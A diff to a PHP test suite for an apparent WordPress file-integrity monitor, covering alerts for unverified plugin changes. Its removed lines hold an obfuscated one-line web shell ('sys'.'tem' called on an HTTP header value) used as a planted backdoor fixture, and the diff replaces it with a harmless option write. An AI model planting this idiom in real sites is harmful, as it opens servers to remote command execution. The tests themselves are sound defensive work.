@@ -201,7 +201,7 @@ t('Monitor: an unverified plugin update alerts once, stays held until accepted, 
     assertSame(1, count($n->sent), 'still pending, not re-alerted');
 
     // While the update waits for review, another file in the same plugin is changed.
-    bump($root, 'wp-content/plugins/premium/inc/helper.php', '<?php function helper() {} $f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");');
+    bump($root, 'wp-content/plugins/premium/inc/helper.php', '<?php function helper() {} update_option("foo_extra", strtoupper(get_bloginfo("name"))); /* a change nothing official vouches for */');
     assertSame(1, $m->run('check')['exit']);
     assertSame(2, count($n->sent), 'a further change while pending must alert again');
     assertContains('inc/helper.php', $n->sent[1]['body']);
@@ -222,7 +222,7 @@ t('Monitor: with auto-accept, a fake version during a wordpress.org outage is al
     $state->writeJson('versions.json', VersionTracker::read($config));
     coreRoute($http, ['wp-includes/version.php' => "<?php\n\$wp_version = '6.4.2';\n"]);
     $http->route('https://downloads.wordpress.org/plugin-checksums/', 503, 'unavailable');
-    putFile($root, 'wp-content/plugins/foo/foo.php', str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . '$f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");' . "\n");
+    putFile($root, 'wp-content/plugins/foo/foo.php', str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . 'update_option("foo_extra", strtoupper(get_bloginfo("name"))); /* a change nothing official vouches for */' . "\n");
     $backdoor = hash_file('sha256', $root . '/wp-content/plugins/foo/foo.php');
 
     assertSame(1, $m->run('check')['exit']);
